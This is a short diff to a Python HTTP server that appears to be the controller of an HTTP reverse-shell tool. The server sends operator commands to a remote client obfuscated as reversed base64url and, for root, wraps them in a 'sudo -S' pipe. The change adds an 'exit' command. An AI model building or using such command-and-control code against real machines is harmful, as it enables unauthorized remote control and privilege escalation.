@@ -192,7 +192,7 @@ class MyServer(BaseHTTPRequestHandler):
 
                     if command is not None:
                         if root and not "cd" in command:
-                            if not wait_for_cmd:
+                            if not wait_for_cmd and not "exit" in command:
                                 old_cmd = command
                                 command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)
 
@@ -201,6 +201,9 @@ class MyServer(BaseHTTPRequestHandler):
                         encoded_command += self.encode_reversed_base64url(command)
                         self._set_headers()
                         self.wfile.write(encoded_command.encode("utf-8"))
+                        if command == "exit":
+                            print (colored("[!] Exiting..\n", "red"))
+                            exit(0)
                         break
 
             else:
